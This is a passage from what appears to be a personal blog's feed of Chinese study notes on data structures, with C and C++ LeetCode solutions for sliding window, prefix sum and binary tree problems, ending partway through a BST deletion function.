    <content type="html"><![CDATA[<h1 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h1><p>插个眼</p><p>以后写</p><p>先做题…</p><h2 id="3-无重复字符的最长字串"><a href="#3-无重复字符的最长字串" class="headerlink" title="3.无重复字符的最长字串"></a>3.无重复字符的最长字串</h2><p><img src="/images/56.png" alt="如图"></p><p>解：</p><p><code>滑动窗口</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">lengthOfLongestSubstring</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">last</span><span class="hljs-params">(<span class="hljs-number">256</span>, <span class="hljs-number">-1</span>)</span></span>;   <span class="hljs-comment">// 记录每个字符上一次出现的位置</span><br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>,left = <span class="hljs-number">0</span>;        <span class="hljs-comment">// 窗口左边界</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> right = <span class="hljs-number">0</span>; right &lt; s.<span class="hljs-built_in">size</span>(); right++)&#123;<br>            <span class="hljs-keyword">if</span>(last[s[right]] &gt;= left)&#123;<br>                left = last[s[right]] + <span class="hljs-number">1</span>;  <span class="hljs-comment">// 如果字符在当前窗口中重复，移动左边界</span><br>            &#125;<br>            last[s[right]] = right;<br>            ans = <span class="hljs-built_in">max</span>(ans, right - left + <span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="438-找到字符串中所有字母异位词"><a href="#438-找到字符串中所有字母异位词" class="headerlink" title="438.找到字符串中所有字母异位词"></a>438.找到字符串中所有字母异位词</h2><p><img src="/images/57.png" alt="如图"></p><p>解：</p><p>同理</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">findAnagrams</span><span class="hljs-params">(string s, string p)</span> </span>&#123;<br>        vector&lt;<span class="hljs-type">int</span>&gt; res;<br>        <span class="hljs-keyword">if</span>(s.<span class="hljs-built_in">size</span>() &lt; p.<span class="hljs-built_in">size</span>()) <span class="hljs-keyword">return</span> res;<br><br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">cnt</span><span class="hljs-params">(<span class="hljs-number">26</span>,<span class="hljs-number">0</span>)</span></span>;<br><br>        <span class="hljs-comment">// 统计 p 中每个字母需要多少个</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">char</span> c: p)&#123;<br>            cnt[c - <span class="hljs-string">&#x27;a&#x27;</span>]++;<br>        &#125;<br><br>        <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>, right = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> need = p.<span class="hljs-built_in">size</span>();  <span class="hljs-comment">// 还需要匹配的字符个数</span><br><br>        <span class="hljs-keyword">while</span>(right &lt; s.<span class="hljs-built_in">size</span>())&#123;<br>            <span class="hljs-comment">// 扩展右边界</span><br>            <span class="hljs-keyword">if</span>(cnt[s[right] - <span class="hljs-string">&#x27;a&#x27;</span>] &gt; <span class="hljs-number">0</span>)&#123;<br>                need--;<br>            &#125;<br>            cnt[s[right] - <span class="hljs-string">&#x27;a&#x27;</span>]--;<br>            right++;<br><br>            <span class="hljs-comment">// 当窗口大小等于 p 的长度时，开始判断并移动左边界</span><br>            <span class="hljs-keyword">if</span>(right - left == p.<span class="hljs-built_in">size</span>())&#123;<br>                <span class="hljs-keyword">if</span>(need == <span class="hljs-number">0</span>)&#123;<br>                    res.<span class="hljs-built_in">push_back</span>(left);<br>                &#125;<br><br>                <span class="hljs-comment">// 收缩左边界</span><br>                <span class="hljs-keyword">if</span>(cnt[s[left] - <span class="hljs-string">&#x27;a&#x27;</span>] &gt;= <span class="hljs-number">0</span>)&#123;<br>                    need++;<br>                &#125;<br>                cnt[s[left] - <span class="hljs-string">&#x27;a&#x27;</span>]++;<br>                left++;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>滑动窗口</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>子串</title>
    <link href="/2026/01/19/%E5%AD%90%E4%B8%B2/"/>
    <url>/2026/01/19/%E5%AD%90%E4%B8%B2/</url>
    
    <content type="html"><![CDATA[<h1 id="子串"><a href="#子串" class="headerlink" title="子串"></a>子串</h1><p>字符串原来也是一种数据结构</p><p>子串又是什么阴</p><p>以后再说…</p><h2 id="560-和为k的子数组"><a href="#560-和为k的子数组" class="headerlink" title="560.和为k的子数组"></a>560.和为k的子数组</h2><p><img src="/images/58.png" alt="如图"></p><p>解：</p><p><code>前缀和</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">subarraySum</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>        unordered_map &lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; cnt;<br>        cnt[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;  <span class="hljs-comment">// 前缀和为 0 出现 1 次</span><br><br>        <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> x : nums)&#123;<br>            sum += x;<br>            <span class="hljs-keyword">if</span>(cnt.<span class="hljs-built_in">count</span>(sum - k))&#123;<br>                ans += cnt[sum - k];<br>            &#125;<br>            cnt[sum]++;<br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LeetCode</tag>
      
      <tag>子串</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数组</title>
    <link href="/2026/01/19/%E6%95%B0%E7%BB%84/"/>
    <url>/2026/01/19/%E6%95%B0%E7%BB%84/</url>
    
    <content type="html"><![CDATA[<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>看着就简单好欺负</p><p>以后再写…</p>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数组</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>矩阵</title>
    <link href="/2026/01/19/%E7%9F%A9%E9%98%B5/"/>
    <url>/2026/01/19/%E7%9F%A9%E9%98%B5/</url>
    
    <content type="html"><![CDATA[<h1 id="矩阵"><a href="#矩阵" class="headerlink" title="矩阵"></a>矩阵</h1><p>线性代数学得怎么样?</p><p>没想到矩阵也是一种数据结构?</p><p>ai主战场</p><p>数学还是很智慧的…</p><p>插眼…</p><p>慢慢写…</p>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>矩阵</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二叉树</title>
    <link href="/2026/01/19/%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    <url>/2026/01/19/%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<h1 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h1><p>先前学习的数据结构中<code>链表</code>和<code>数组</code>均表示线性结构</p><p>然而现实世界十分复杂，怎么可能事物之间都是线性关系呢？</p><p>因此引入了<code>树</code>这种数据结构</p><p><strong>树</strong>是一种用于描述<code>层级关系</code>的<strong>非线性</strong>数据结构，由若干节点组成，其中存在一个唯一的起点(根节点root)，其余节点通过<code>父子关系</code>组织起来，很好想象吧</p><p>先来看看最典型的树，<strong>二叉树</strong>，一种特殊的树结构，其中每个节点最多包含两个子节点</p><p>各种乱七八糟的定义先不管(自己问豆包qwq)</p><p>直观地理解一下</p><p>可以想到</p><p>二叉树的任意一个节点都可以被视为一棵更小的二叉树，问题往往可以通过<strong>递归</strong>算法拆解为当前节点+左子树的问题+右子树的问题，层层递归，直至没有节点</p><p>空讲有点抽象</p><p>首先来看看二叉树的三种遍历方式</p><p>用递归的方式应该很好理解…</p><h2 id="94-二叉树的中序遍历"><a href="#94-二叉树的中序遍历" class="headerlink" title="94.二叉树的中序遍历"></a>94.二叉树的中序遍历</h2><ul><li><p>中序遍历: 左 -&gt; 根 -&gt; 右</p></li><li><p>前序遍历: 根 -&gt; 左 -&gt; 右</p></li><li><p>后序遍历: 左 -&gt; 右 -&gt; 根</p></li></ul><p><img src="/images/34.png" alt="如图"></p><p><strong>递归</strong></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     TreeNode *left;</span><br><span class="hljs-comment"> *     TreeNode *right;</span><br><span class="hljs-comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;<span class="hljs-type">int</span>&gt; res;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(TreeNode* root)</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(!root) <span class="hljs-keyword">return</span>;<br>        <span class="hljs-built_in">dfs</span>(root-&gt;left);<br>        res.<span class="hljs-built_in">push_back</span>(root-&gt;val);<br>        <span class="hljs-built_in">dfs</span>(root-&gt;right);<br>    &#125;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">inorderTraversal</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-built_in">dfs</span>(root);<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>求解二叉树的最大深度也是同样的思路</p><h2 id="104-二叉树的最大深度"><a href="#104-二叉树的最大深度" class="headerlink" title="104.二叉树的最大深度"></a>104.二叉树的最大深度</h2><p><img src="/images/35.png" alt="如图"></p><p><code>递归</code></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxDepth</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(!root) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">max</span>(<span class="hljs-built_in">maxDepth</span>(root-&gt;left), <span class="hljs-built_in">maxDepth</span>(root-&gt;right)) + <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>后面简单做了一些题目加深理解…</p><h2 id="226-翻转二叉树"><a href="#226-翻转二叉树" class="headerlink" title="226.翻转二叉树"></a>226.翻转二叉树</h2><p><img src="/images/36.png" alt="如图"></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">invertTree</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(!root) <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>        TreeNode* left = <span class="hljs-built_in">invertTree</span>(root-&gt;left);<br>        TreeNode* right = <span class="hljs-built_in">invertTree</span>(root-&gt;right);<br><br>        root-&gt;right = left;<br>        root-&gt;left = right;<br>        <span class="hljs-keyword">return</span> root;<br>    &#125; <br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="101-对称二叉树"><a href="#101-对称二叉树" class="headerlink" title="101.对称二叉树"></a>101.对称二叉树</h2><p><img src="/images/37.png" alt="如图"></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isSymmetric</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(!root) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">isMirror</span>(root-&gt;left,root-&gt;right);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isMirror</span><span class="hljs-params">(TreeNode* a,TreeNode* b)</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(!a &amp;&amp; !b) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">//剪枝</span><br>        <span class="hljs-keyword">if</span>(!a || !b) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">if</span>(a-&gt;val != b-&gt;val) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">isMirror</span>(a-&gt;left,b-&gt;right) &amp;&amp; <span class="hljs-built_in">isMirror</span>(a-&gt;right,b-&gt;left); <span class="hljs-comment">//对称</span><br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="543-二叉树的直径"><a href="#543-二叉树的直径" class="headerlink" title="543.二叉树的直径"></a>543.二叉树的直径</h2><p><img src="/images/38.png" alt="如图"></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">depth</span><span class="hljs-params">(TreeNode* root)</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(!root) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> left = <span class="hljs-built_in">depth</span>(root-&gt;left);<br>        <span class="hljs-type">int</span> right = <span class="hljs-built_in">depth</span>(root-&gt;right);<br><br>        ans = <span class="hljs-built_in">max</span>(ans, left + right); <span class="hljs-comment">//举一反三</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">max</span>(left, right) + <span class="hljs-number">1</span>;<br>    &#125; <br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">diameterOfBinaryTree</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-built_in">depth</span>(root);<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="108-将有序数组转换为二叉搜索树"><a href="#108-将有序数组转换为二叉搜索树" class="headerlink" title="108.将有序数组转换为二叉搜索树"></a>108.将有序数组转换为二叉搜索树</h2><p>二叉搜索树 <code>BST</code>，引入了大小关系，定义是对于任意一个节点，其左子树中所有节点的值都小于该节点，而右子树中所有节点的值都大于该节点</p><p>传统数组or链表查找，需要循环遍历，时间复杂度为$O(n)$</p><p>而不难想到二叉搜索树是$O(\log n)$</p><p>可见其在查找这件事上的优越性，类似于<strong>二分</strong>的思想?</p><p><img src="/images/39.png" alt="如图"></p><p>解：</p><p><strong>递归</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">build</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(l &gt; r) <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>        <span class="hljs-type">int</span> mid = l + (r - l) / <span class="hljs-number">2</span>; <span class="hljs-comment">//二分</span><br>        TreeNode* root = <span class="hljs-keyword">new</span> <span class="hljs-built_in">TreeNode</span>(nums[mid]);<br>        root-&gt;left = <span class="hljs-built_in">build</span>(nums, l, mid - <span class="hljs-number">1</span>);<br>        root-&gt;right = <span class="hljs-built_in">build</span>(nums, mid + <span class="hljs-number">1</span>, r);<br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">sortedArrayToBST</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">build</span>(nums,<span class="hljs-number">0</span>,nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>);<br>    &#125; <br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="102-二叉树的层序遍历"><a href="#102-二叉树的层序遍历" class="headerlink" title="102.二叉树的层序遍历"></a>102.二叉树的层序遍历</h2><p><img src="/images/40.png" alt="如图"></p><p>要用到<code>队列</code>数据结构，其实我感觉队列和栈都挺好理解的，一个先进先出，一个后进先出罢了</p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">levelOrder</span>(TreeNode* root) &#123;<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; res;<br>        <span class="hljs-keyword">if</span> (!root) <span class="hljs-keyword">return</span> res;<br>        queue&lt;TreeNode*&gt; q;  <span class="hljs-comment">//队列 先进先出 FIFO</span><br>        q.<span class="hljs-built_in">push</span>(root);<br>        <span class="hljs-keyword">while</span> (!q.<span class="hljs-built_in">empty</span>()) &#123;<br>            vector&lt;<span class="hljs-type">int</span>&gt; level;<br>            <span class="hljs-type">int</span> size = q.<span class="hljs-built_in">size</span>();<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++) &#123;<br>                TreeNode* node = q.<span class="hljs-built_in">front</span>();<br>                q.<span class="hljs-built_in">pop</span>();<br>                level.<span class="hljs-built_in">push_back</span>(node-&gt;val);<br>                <span class="hljs-keyword">if</span>(node-&gt;left) q.<span class="hljs-built_in">push</span>(node-&gt;left);<br>                <span class="hljs-keyword">if</span>(node-&gt;right) q.<span class="hljs-built_in">push</span>(node-&gt;right);<br>            &#125;<br>            res.<span class="hljs-built_in">push_back</span>(level);<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="二叉搜索树的插入-搜索与删除"><a href="#二叉搜索树的插入-搜索与删除" class="headerlink" title="二叉搜索树的插入,搜索与删除"></a>二叉搜索树的插入,搜索与删除</h2><p><code>递归实现</code></p><p>删除操作稍微麻烦一点，分类讨论即可</p><p>思考,思索…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//定义</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span> &#123;</span><br>    <span class="hljs-type">int</span> data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span>* <span class="hljs-title">left</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span>* <span class="hljs-title">right</span>;</span><br>&#125; TreeNode;<br><br><span class="hljs-comment">//插入</span><br>TreeNode* <span class="hljs-title function_">insert</span><span class="hljs-params">(TreeNode* t, <span class="hljs-type">int</span> val)</span> &#123;<br>    <span class="hljs-keyword">if</span> (t == <span class="hljs-literal">NULL</span>) &#123;<br>        TreeNode* newNode = (TreeNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(TreeNode));<br>        newNode-&gt;data = val;<br>        newNode-&gt;left = <span class="hljs-literal">NULL</span>;<br>        newNode-&gt;right = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">return</span> newNode;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (val &lt; t-&gt;data) &#123;<br>        t-&gt;left = insert(t-&gt;left, val);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (val &gt; t-&gt;data) &#123;<br>        t-&gt;right = insert(t-&gt;right, val);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> t;<br>&#125;<br><br><span class="hljs-comment">//搜索</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">search</span><span class="hljs-params">(TreeNode* root, <span class="hljs-type">int</span> key)</span> &#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (root-&gt;data == key) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (root-&gt;data &lt; key) &#123;<br>        <span class="hljs-keyword">return</span> search(root-&gt;right, key);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> search(root-&gt;left, key);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//删除(3种情况)</span><br>TreeNode* <span class="hljs-title function_">findMin</span><span class="hljs-params">(TreeNode* node)</span>&#123;<br>    <span class="hljs-keyword">if</span>(node == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">while</span>(node-&gt;left != <span class="hljs-literal">NULL</span>)&#123;<br>        node = node-&gt;left;<br>    &#125;<br>    <span class="hljs-keyword">return</span> node;<br>&#125;<br><br>TreeNode* <span class="hljs-title function_">removeNode</span><span class="hljs-params">(TreeNode* root,<span class="hljs-type">int</span> val)</span>&#123;<br>    <span class="hljs-keyword">if</span>(root == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span>(root-&gt;data 